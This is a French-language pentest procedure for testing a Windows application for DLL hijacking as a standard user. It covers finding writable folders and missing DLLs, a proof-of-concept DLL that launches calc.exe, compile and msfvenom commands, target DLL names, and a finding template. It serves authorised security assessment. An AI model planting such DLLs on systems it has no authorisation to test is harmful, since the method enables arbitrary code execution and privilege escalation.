# Procédure de Test DLL Hijacking (User Non-Admin)

## Principe

Quand une application Windows charge une DLL, elle la recherche dans un ordre précis (DLL Search Order) :
1. Répertoire de l'exécutable
2. System32 (C:\Windows\System32)
3. System (C:\Windows\System)
4. Répertoire Windows (C:\Windows)
5. Répertoire courant (%CD%)
6. Répertoires du PATH

Si un utilisateur standard peut écrire dans l'un de ces répertoires (surtout le 1er), il peut planter une DLL malveillante qui sera chargée avec les privilèges de l'app.

## Prérequis

- L'app installée, examinée avec Process Explorer / listDLLs
- Identification d'une DLL chargée par l'app depuis un emplacement user-writable
- Compte user standard (non-admin)

## Étapes

### 1. Identifier les DLL chargées par l'app

```
# Option A : Process Explorer (GUI)
# Lancer Process Explorer > Trouver le process <app>.exe
# View > Lower Pane View > DLLs
# Noter toutes les DLLs chargées et leurs chemins

# Option B : listDLLs (CLI)
listdlls <app>.exe
```

Chercher :
- DLLs dans des emplacements non-standard (pas System32)
- DLLs chargées depuis `C:\Program Files\<App>` (si Users:(W) sur ce dossier)
- DLLs chargées depuis %APPDATA%, %TEMP% ou %PATH%

### 2. Vérifier les permissions du dossier d'installation

```cmd
icacls "C:\Program Files\<App>"
# Chercher : BUILTIN\Users:(W) ou (M) = inscriptible par tous les users
```

Si `Users` a (W) ou (M) → c'est un dossier de hijack potentiel.

### 3. Identifier les DLL manquantes (le plus fructueux)

Process Monitor (procmon) est la meilleure approche ici :

1. Lancer Process Monitor
2. Filter : Process Name = `<app>.exe`, Result = `NAME NOT FOUND`
3. Lancer l'app
4. Process Monitor montrera toutes les DLLs recherchées mais non trouvées
5. Noter les noms des DLLs recherchées dans des emplacements user-writable

### 4. Créer une DLL de test

```c
// payload.c — DLL simple qui lance calc.exe
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        WinExec("calc.exe", SW_SHOW);
    }
    return TRUE;
}
```

Compilation (depuis l'hôte Linux avec MinGW si dispo, ou sur la VM avec Visual Studio) :
```bash
x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -lwinhttp
# OU pour x86 :
i686-w64-mingw32-gcc -shared -o payload.dll payload.c
```

Si pas de compilateur : utiliser msfvenom (Metasploit Framework) :
```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f dll -o payload.dll
```

### 5. Placer et tester

1. Copier `payload.dll` dans le répertoire identifié (inscriptible par user standard)
2. Renommer avec le nom de la DLL recherchée (`version.dll`, `d3d11.dll`, etc.)
3. Fermer l'app complètement
4. Lancer l'app depuis le compte user standard
5. Si `calc.exe` apparaît → DLL hijacking confirmé

### 6. Documenter

```
Finding : DLL Hijacking dans <App>
Sévérité : Majeur (si l'app tourne en Medium integrity) / Critique (si High integrity ou admin)
Localisation : C:\Program Files\<App>\<dll_name>.dll
Prérequis : Utilisateur standard (non-admin)
Preuve : [screenshot de calc.exe ouvert après lancement de l'app]
Impact : Exécution de code arbitraire dans le contexte de l'app. Si l'app
         s'exécute avec des privilèges supérieurs (admin/SYSTEM), élévation
         de privilèges complète.
```

## Vecteurs courants à tester

| DLL | Cible fréquente | Pourquoi |
|-----|----------------|----------|
| `version.dll` | Presque toutes les apps | Fonction Core API, souvent recherchée |
| `d3d11.dll` | Apps graphiques | DirectX, non présente dans tous les chemins |
| `dwmapi.dll` | Apps modern UI | Desktop Window Manager |
| `winhttp.dll` | Apps réseau | HTTP client, souvent chargée |
| `uxtheme.dll` | Apps GUI | Theming, chargée au démarrage |
| `dbghelp.dll` | Apps avec crash handler | Debug helper |

## Notes

- WOW64 (32-bit apps sur 64-bit Windows) : chercher les DLLs dans `C:\Windows\SysWOW64` et `C:\Windows\Sysnative`
- SafeDllSearchMode (activé par défaut depuis XP SP2) met System32 en second (après le répertoire de l'exe) — ça ne protège pas si le répertoire de l'exe est writable
- Vérifier `C:\Windows` lui-même — dans très rares cas, `Users` a des droits d'écriture (modification hardening box)
